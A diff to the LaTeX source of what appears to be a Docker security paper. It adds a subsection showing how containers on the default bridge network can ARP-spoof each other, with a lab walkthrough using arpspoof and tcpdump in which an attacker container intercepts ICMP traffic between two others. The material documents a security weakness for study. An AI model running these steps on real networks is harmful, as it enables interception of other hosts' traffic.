@@ -159,7 +159,6 @@ However, giving containers access to the API (by adding the socket as a volume) 
 }}
 
 \subsubsection{Finding Secrets}
-
 \begin{lstlisting}[caption={Example extract secrets using the Docker API},captionpos=b]
 (host)$ docker run --name database -e POSTGRES_PASSWORD=thisshouldbesecret -d postgres
 ...
@@ -197,3 +196,51 @@ Many of the Docker container escape vulnerabilities exist because a container ca
 
 \subsection{Readable configuration files}
 \todo[inline]{\href{https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/gather/docker_creds.rb}{Metasploit Multi Gather Docker Credentials Collection}}
+
+\subsection{ARP Spoofing}
+By default all Docker containers are added to the same bridge network. This means they are able to reach each other. By default Docker containers also receive the \lstinline{CAP_NET_RAW} capability, which allows them to create raw packets. This means that by default, containers are able to ARP spoof other containers.
+
+\hfill
+
+Lets take a look at how this in a practical example. Lets say we have three containers. One container will ping another container. The third "malicious" container wants to intercept the \lstinline{ICMP} packets.
+
+We start three Docker containers using the \lstinline{ubuntu:latest} image (which is the same as \lstinline{ubunut:bionic-20191029} at the time of writing). They have the following names IPv4 addresses and MAC addresses:
+\begin{itemize}
+    \item \lstinline{victim0}: \lstinline{172.17.0.2} and \lstinline{02:42:ac:11:00:02}
+    \item \lstinline{victim1}: \lstinline{172.17.0.3} and \lstinline{02:42:ac:11:00:03}
+    \item \lstinline{attacker}: \lstinline{172.17.0.4} and \lstinline{02:42:ac:11:00:04}
+\end{itemize}
+
+We use \lstinline{vic0}, \lstinline{vic1} and \lstinline{atck} instead of \lstinline{cont} to indicate in which container a command is executed.
+
+\begin{lstlisting}[caption={Docker container ARP spoof},captionpos=b]
+(host)$ docker run --rm -it --name=victim0 --hostname=victim0 ubuntu:latest /bin/bash
+(vic0)# apt update
+...
+(vic0)# apt install net-tools iproute2 iputils-ping
+...
+(host)$ docker run --rm -it --name=victim1 --hostname=victim1 ubuntu:latest /bin/bash
+(host)$ docker run --rm -it --name=attacker --hostname=attacker ubuntu:latest /bin/bash
+(atck)# apt update
+...
+(atck)# apt install dsniff net-tools iproute2 tcpdump
+...
+(atck)# arpspoof -i eth0 -t 172.17.0.2 172.17.0.3
+...
+(vic0)# arp
+arp
+172.17.0.3 ether 02:42:ac:11:00:04 C eth0
+...
+172.17.0.4 ether 02:42:ac:11:00:04 C eth0
+(vic0)# ping 172.17.0.3
+...
+(atck)# tcpdump -vni eth0 icmp
+...
+10:16:18.368351 IP (tos 0x0, ttl 63, id 52174, offset 0, flags [DF], proto ICMP (1), length 84)
+    172.17.0.2 > 172.17.0.3: ICMP echo request, id 898, seq 5, length 64
+10:16:18.368415 IP (tos 0x0, ttl 64, id 8188, offset 0, flags [none], proto ICMP (1), length 84)
+    172.17.0.3 > 172.17.0.2: ICMP echo reply, id 898, seq 5, length 64
+...
+\end{lstlisting}
+
+We first start three containers and install dependencies. We then start to poison the ARP table of \lstinline{victim0}. We can observe this by looking at the ARP table of \lstinline{victim0} (with the \lstinline{arp} command). We see that the entries for \lstinline{172.17.0.3} and \lstinline{172.17.0.4} are the same (\lstinline{02:42:ac:11:00:04}). If we then start pinging \lstinline{victim1} from \lstinline{victim0} and looking at the \lstinline{ICMP} traffic on \lstinline{attacker}, we see that the \lstinline{ICMP} packets are routed through \lstinline{attacker}.
